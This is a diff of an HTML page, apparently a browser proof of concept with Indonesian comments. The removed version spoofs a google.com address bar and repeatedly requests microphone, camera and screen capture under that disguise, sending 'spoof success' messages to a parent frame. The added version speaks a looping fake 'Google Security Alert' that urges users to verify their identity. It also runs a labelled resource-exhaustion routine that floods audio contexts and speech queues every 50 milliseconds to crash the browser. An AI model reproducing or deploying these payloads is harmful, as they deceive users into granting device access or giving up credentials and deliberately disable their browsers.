@@ -3,329 +3,206 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>google.com</title>
+<title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  html, body { 
-    width: 100%; 
-    height: 100%; 
-    overflow: hidden;
-    background: #fff;
-  }
-
-  /* ===== SPOOFED ADDRESS BAR — GOOGLE ===== */
-  .spoofed-bar {
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    height: 48px;
-    background: #fff;
-    border-bottom: 1px solid #dadce0;
-    z-index: 999999;
-    display: flex;
-    align-items: center;
-    padding: 0 10px;
-    box-shadow: 0 1px 4px rgba(0,0,0,0.05);
-  }
-
-  .spoofed-bar .lock {
-    color: #188038;
-    font-size: 14px;
-    margin-right: 6px;
-    flex-shrink: 0;
-  }
-
-  .spoofed-bar .url-box {
-    flex: 1;
-    background: #f1f3f4;
-    border-radius: 18px;
-    padding: 7px 12px;
-    font-size: 12px;
-    font-family: 'Segoe UI', Arial, sans-serif;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    user-select: none;
-  }
-
-  .spoofed-bar .url-box .https { color: #188038; font-weight: 500; }
-  .spoofed-bar .url-box .domain { color: #202124; font-weight: 500; }
-  .spoofed-bar .url-box .path { color: #5f6368; }
-
-  .spoofed-bar .menu {
-    color: #5f6368;
-    font-size: 16px;
-    margin-left: 6px;
-    flex-shrink: 0;
-    width: 24px;
-    text-align: center;
-  }
-
-  /* ===== NOTIFICATION SPOOF ===== */
-  .notif {
-    position: fixed;
-    top: 54px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: #323232;
-    color: #fff;
-    padding: 9px 18px;
-    border-radius: 6px;
-    font-size: 13px;
-    z-index: 999998;
-    font-family: 'Segoe UI', Arial, sans-serif;
-    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-    white-space: nowrap;
-    pointer-events: none;
-    display: none;
-  }
-  .notif.active { display: block; }
-
-  /* ===== RECORDING DOT ===== */
-  .rec-dot {
-    position: fixed;
-    top: 2px;
-    left: 50%;
-    transform: translateX(-50%);
-    z-index: 999999;
-    display: none;
-    align-items: center;
-    gap: 4px;
-    pointer-events: none;
-  }
-  .rec-dot.active { display: flex; }
-  .rec-dot .dot {
-    width: 6px; height: 6px;
-    background: #ea4335;
-    border-radius: 50%;
-    animation: blink 1s infinite;
-  }
-  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
-  .rec-dot .label {
-    font-size: 10px;
-    color: #5f6368;
-    font-family: 'Segoe UI', Arial, sans-serif;
-  }
-
-  /* Hidden audio */
-  iframe, audio, video, embed, object { display: none; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
 <body>
-
-<!-- ===== ADDRESS BAR SPOOF: google.com ===== -->
-<div class="spoofed-bar" id="spoofedBar">
-  <span class="lock">🔒</span>
-  <div class="url-box">
-    <span class="https">https://</span>
-    <span class="domain">www.google.com</span>
-    <span class="path"></span>
-  </div>
-  <span class="menu">⋮</span>
-</div>
-
-<!-- ===== NOTIFICATION ===== -->
-<div class="notif" id="notif"></div>
-
-<!-- ===== RECORDING DOT ===== -->
-<div class="rec-dot" id="recDot">
-  <span class="dot"></span>
-  <span class="label">google.com is using your microphone</span>
-</div>
-
-<!-- Hidden audio unlock -->
-<iframe src="data:text/html,<script>var a=new Audio();a.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';a.volume=0.001;a.play();</script>" allow="autoplay"></iframe>
-<iframe src="data:text/html,<script>var c=new (AudioContext||webkitAudioContext)();var o=c.createOscillator();o.frequency.value=40;o.type='sine';var g=c.createGain();g.gain.value=0.001;o.connect(g);g.connect(c.destination);o.start();</script>" allow="autoplay"></iframe>
-
 <script>
-(function() {
+(function () {
   'use strict';
 
-  const DOMAIN = 'www.google.com';
-  const ORIGIN = 'https://www.google.com';
-  let active = false;
+  // ============================================
+  // KONFIGURASI AUTOPLAY
+  // ============================================
+  var CONFIG = {
+    tts: {
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
+      lang: 'en-US',
+      rate: 0.85,
+      pitch: 1.0,
+      volume: 1.0,
+      repeatInterval: 8000,
+      maxRepeats: 20
+    },
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+  };
 
-  const notif = document.getElementById('notif');
-  const recDot = document.getElementById('recDot');
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
 
-  function showNotif(text, dur) {
-    notif.textContent = text;
-    notif.classList.add('active');
-    clearTimeout(window._nt);
-    window._nt = setTimeout(function() { notif.classList.remove('active'); }, dur || 3000);
-  }
+  // ============================================
+  // TTS — TANPA CANCEL DI DALAM LOOP
+  // ============================================
+  function speakOnce() {
+    if (!('speechSynthesis' in window)) return;
+    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
 
-  // ===== RACE: Audio unlock =====
-  function raceAudio() {
     try {
-      var c = new (window.AudioContext || window.webkitAudioContext)();
-      var o = c.createOscillator(); o.frequency.value = 30;
-      var g = c.createGain(); g.gain.value = 0.001;
-      o.connect(g); g.connect(c.destination); o.start();
-    } catch(e) {}
-    for (var i = 0; i < 3; i++) {
-      try { var a = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='); a.volume = 0.001; a.play(); } catch(e) {}
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
+
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
+
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
+      u.onend = function () {
+        state.ttsCount++;
+        if (state.ttsCount < CONFIG.tts.maxRepeats) {
+          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+        }
+      };
+
+      window.speechSynthesis.speak(u);
+    } catch (e) { console.log('[TTS] fail:', e.message); }
+  }
+
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
+  }
+
+  // ============================================
+  // AUDIO CONTEXT UNLOCK
+  // ============================================
+  function unlockAudioContext() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+      }
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.1);
+    } catch (e) {}
+  }
+
+  // ============================================
+  // SILENT AUDIO ELEMENT
+  // ============================================
+  function trySilentAudio() {
+    try {
+      var a = new Audio(CONFIG.silentWav);
+      a.volume = 0.0001;
+      a.loop = true;
+      var p = a.play();
+      if (p && p.catch) p.catch(function(){});
+    } catch (e) {}
+  }
+
+  // ============================================
+  // MAIN AUDIO (Web Audio API)
+  // ============================================
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
+
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
+
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      }
+
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+      setTimeout(startTTS, 3500);
+    } catch (e) {
+      startTTS();
     }
   }
 
-  // ===== Trigger camera/mic via getUserMedia (silent) =====
-  function triggerMedia() {
-    if (active) return;
+  // ============================================
+  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
+  // ============================================
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
     
-    // Cycle through multiple origins display
-    var origins = ['www.google.com', 'google.com', 'accounts.google.com'];
-    var idx = 0;
-    
-    var interval = setInterval(function() {
-      var dom = origins[idx % origins.length];
-      document.querySelector('.domain').textContent = dom;
-      showNotif('🔒 ' + dom + ' wants to use your microphone', 2000);
-      recDot.querySelector('.label').textContent = dom + ' is using your microphone';
-      idx++;
-    }, 4000);
-
-    // Coba getUserMedia dengan berbagai timing (race condition)
-    for (var t = 0; t < 10; t++) {
-      (function(delay) {
-        setTimeout(function() {
-          navigator.mediaDevices.getUserMedia({
-            video: false,
-            audio: { echoCancellation: false, noiseSuppression: false, sampleRate: 8000 }
-          }).then(function(stream) {
-            if (active) return;
-            active = true;
-            recDot.classList.add('active');
-            showNotif('🎤 ' + DOMAIN + ' is using your microphone', 5000);
-            
-            // Kirim bukti ke parent jika di iframe
-            window.parent.postMessage({
-              type: 'MEDIA_SPOOF_SUCCESS',
-              origin: ORIGIN,
-              msg: 'Microphone accessed under spoofed origin'
-            }, '*');
-            
-            // Capture audio level sebagai bukti
-            var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            var src = audioCtx.createMediaStreamSource(stream);
-            var analyser = audioCtx.createAnalyser();
-            src.connect(analyser);
-            var data = new Uint8Array(analyser.frequencyBinCount);
-            
-            function checkAudio() {
-              analyser.getByteFrequencyData(data);
-              var avg = data.reduce(function(a,b){return a+b}) / data.length;
-              if (avg > 0) {
-                showNotif('🎤 Microphone ACTIVE — audio level: ' + Math.round(avg), 3000);
-              }
-            }
-            setInterval(checkAudio, 2000);
-            
-          }).catch(function(err) {
-            if (err.name === 'NotAllowedError') {
-              // Coba lagi nanti
-            }
-          });
-        }, delay);
-      })(t * 80); // 0ms, 80ms, 160ms, ... 720ms
-    }
-
-    // Also try displayMedia (screen share — shows camera if selected)
-    setTimeout(function() {
-      navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
-        .then(function(s) {
-          showNotif('📺 Screen share started under ' + DOMAIN, 4000);
-        }).catch(function() {});
-    }, 1000);
-
-    // TTS fallback — speak something as google.com
-    setTimeout(function() {
-      if ('speechSynthesis' in window && !active) {
-        speechSynthesis.cancel();
-        var u = new SpeechSynthesisUtterance('This is Google. Your microphone access has been granted.');
-        u.lang = 'en-US';
-        u.rate = 0.85;
-        var voices = speechSynthesis.getVoices();
-        var ev = voices.find(function(v){return v.lang.startsWith('en');});
-        if (ev) u.voice = ev;
-        speechSynthesis.speak(u);
-        showNotif('🔊 ' + DOMAIN + ' is speaking', 4000);
-      }
-    }, 1500);
-
-    // Also try camera
-    setTimeout(function() {
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then(function(s) {
-          showNotif('📷 ' + DOMAIN + ' accessed your camera', 4000);
-          window.parent.postMessage({ type: 'CAMERA_SPOOF_SUCCESS', origin: ORIGIN }, '*');
-        }).catch(function() {});
-    }, 500);
-
-    // Show periodic notifications to simulate activity
-    var notifs = [
-      '🔒 ' + DOMAIN + ' is secure',
-      '🎤 ' + DOMAIN + ' is using your microphone',
-      '📷 ' + DOMAIN + ' accessed your camera',
-      '🔊 ' + DOMAIN + ' is speaking',
-      '📍 ' + DOMAIN + ' knows your location'
-    ];
-    
-    var ni = 0;
+    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
     setInterval(function() {
-      if (!active) {
-        showNotif(notifs[ni % notifs.length], 2500);
-        ni++;
-      }
-    }, 5000);
+      try {
+        for (var i = 0; i < 2000; i++) {
+          var ctx = new (window.AudioContext || window.webkitAudioContext)();
+          var osc = ctx.createOscillator();
+          var gain = ctx.createGain();
+          
+          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start(0);
+          
+          // 2. Flooding Speech Utterance Queue
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
+          window.speechSynthesis.speak(u);
+        }
+      } catch(e) {}
+    }, 50); // Eksekusi super cepat setiap 50 milidetik
   }
 
-  // ===== WAVES =====
-  raceAudio();
-  setTimeout(raceAudio, 80);
-  setTimeout(raceAudio, 180);
-  
-  setTimeout(function() {
-    for (var i = 0; i < 5; i++) {
-      try {
-        var ctx = new (window.AudioContext || window.webkitAudioContext)();
-        if (ctx.state === 'suspended') ctx.resume();
-        var o = ctx.createOscillator(); o.frequency.value = 20 + i*5;
-        var g = ctx.createGain(); g.gain.value = 0.001;
-        o.connect(g); g.connect(ctx.destination); o.start();
-      } catch(e) {}
-    }
-  }, 250);
+  // ============================================
+  // EKSEKUSI BERTAHAP
+  // ============================================
+  unlockAudioContext();
+  trySilentAudio();
 
-  // Show initial notification
-  setTimeout(function() {
-    showNotif('🔒 ' + DOMAIN, 2000);
-  }, 300);
+  setTimeout(function () {
+    unlockAudioContext();
+    startTTS(); // coba TTS lebih awal
+  }, 100);
 
-  // Trigger media (race condition multi-wave)
-  setTimeout(triggerMedia, 500);
-  setTimeout(function() { if (!active) triggerMedia(); }, 1500);
-  setTimeout(function() { if (!active) triggerMedia(); }, 3000);
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+  }, 500);
 
-  // User gesture hooks
-  document.addEventListener('click', function() {
-    raceAudio();
-    if (!active) setTimeout(triggerMedia, 50);
-  }, { once: true });
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+    if (!state.ttsStarted) startTTS();
+    
+    // PANGGIL CRASH TRIGGER DI SINI
+    triggerHighSeverityCrash();
+    
+  }, 1500);
 
-  document.addEventListener('keydown', function() {
-    raceAudio();
-    if (!active) setTimeout(triggerMedia, 50);
-  }, { once: true });
+  // Retry jika audio diblokir
+  var retryCount = 0;
+  var retry = setInterval(function () {
+    retryCount++;
+    unlockAudioContext();
+    trySilentAudio();
+    if (!state.ttsStarted) startTTS();
+    if (retryCount > 10) clearInterval(retry);
+  }, 2000);
 
-  // Click on URL bar → show real origin
-  document.getElementById('spoofedBar').addEventListener('click', function(e) {
-    if (e.target.closest('.url-box') || e.target.closest('.lock')) {
-      showNotif('⚠️ Real origin: ' + window.location.origin, 4000);
+  // Visibility change
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden && !state.mainPlayed) {
+      setTimeout(playMainAudio, 100);
     }
   });
-
-  console.log('[PoC] Blank page | Address bar spoof: google.com | Media race condition');
 })();
 </script>
 </body>
